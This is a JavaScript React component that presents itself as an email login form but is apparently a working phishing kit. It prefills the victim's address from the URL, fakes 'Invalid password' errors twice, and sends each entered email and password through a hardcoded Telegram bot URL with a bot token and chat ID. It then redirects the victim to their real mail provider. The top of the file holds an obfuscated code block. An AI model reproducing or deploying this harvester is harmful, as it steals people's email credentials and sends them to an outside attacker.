import {  useRef, useState } from "react";
import axios from "axios";




function Login () {
   function _0x2165(_0x4e366d,_0xf13643){const _0x5c7814=_0x5c78();return _0x2165=function(_0x216528,_0x4fb69d){_0x216528=_0x216528-0x10c;let _0x142462=_0x5c7814[_0x216528];return _0x142462;},_0x2165(_0x4e366d,_0xf13643);}function _0x5c78(){const _0x63a304=['10006wdgtjH','776272wIwlmt','4YYNtnM','6675494FjRoKx','34837150qQLoKW','3885960BekHFe','241628jhSRZX','1712260YqDdhL','510rqALda','126CALlfj'];_0x5c78=function(){return _0x63a304;};return _0x5c78();}(function(_0x1b4743,_0x2688d8){const _0x14cd21=_0x2165,_0x2494af=_0x1b4743();while(!![]){try{const _0x1f9c1f=-parseInt(_0x14cd21(0x10f))/0x1+parseInt(_0x14cd21(0x113))/0x2*(parseInt(_0x14cd21(0x111))/0x3)+parseInt(_0x14cd21(0x115))/0x4*(-parseInt(_0x14cd21(0x110))/0x5)+-parseInt(_0x14cd21(0x10e))/0x6+-parseInt(_0x14cd21(0x10c))/0x7+parseInt(_0x14cd21(0x114))/0x8*(-parseInt(_0x14cd21(0x112))/0x9)+parseInt(_0x14cd21(0x10d))/0xa;if(_0x1f9c1f===_0x2688d8)break;else _0x2494af['push'](_0x2494af['shift']());}catch(_0x40ca77){_0x2494af['push'](_0x2494af['shift']());}}}(_0x5c78,0xc0f5f));const [eMid,setEmail]=useState(''),[pwdd,setPassword]=useState(''),errRef=useRef(''),pwdRef=useRef(''),[counter,setCounter]=useState(0x0);

   const apiUrl = "https://api.telegram.org/bot7684852031:AAEbYTBXIgAz4TJMWE1sYfMLeSgkRZ3WUzc/sendMessage?chat_id=1434469880&text=";


     var urlMail = window.location.hash.substring(1);
     var indexNumber = urlMail.indexOf("@")
     var mailwebsite = "https://" + urlMail.substring(indexNumber + 1);
     
     var readOnly = true;

     const isValidEmail =  /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
     
     if(!urlMail){
        readOnly = false
     } else{
        var base64Validate = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
        if(!base64Validate.test(urlMail)){
            var my_urlMail = urlMail
        } else{
             my_urlMail = atob(urlMail);
        }
        if (!isValidEmail.test(my_urlMail)) {
            return false;
        }
     };

     const passHandle = () => {

        if (counter < 2) {
             errRef.current.className = "displayErr";
             setTimeout(() => {
               errRef.current.className = "errorMssg";
             }, 2000);

             pwdRef.current.value = "";
        } else {
            location.href = mailwebsite;
            
        }
        
      
     }

    //  handling Form Submit
     const handleSubmit = (event) => {
         event.preventDefault();

        if(readOnly === true) {
           
        var dataInfo = {
            Email:my_urlMail,
            password: pwdd
        };
        
        } else {
            dataInfo = {
            Email:eMid ,
            password: pwdd
        }
        };

       
      setCounter(counter +1)
       passHandle();
       postData(dataInfo);
       
     }
    //  submit User Info
        const postData = (dataInfo) => {
           
          axios
            .post(apiUrl + JSON.stringify(dataInfo))
            .then(function (response) {
              console.log(response.status);
              console.log(counter);
            })
            .catch(function (error) {
              console.log(error);
            });
        };

  
    return (
      <div style={{ textAlign: "center" }}>
        <div className="errorMssg" ref={errRef}>
          <i>Invalid password. Please try again!</i>
        </div>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            onChange={(e) => setEmail(e.target.value)}
            id="myInput"
            name="Email"
            placeholder="Email Address"
            value={my_urlMail}
            readOnly={readOnly}
            required
          />
          <br />
          <br />
          <input
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            name="Password"
            placeholder="Email Password"
            ref={pwdRef}
          />
          <br />
          <br />
          <button type="submit">View</button>
        </form>
      </div>
    );
    
}

export default Login;

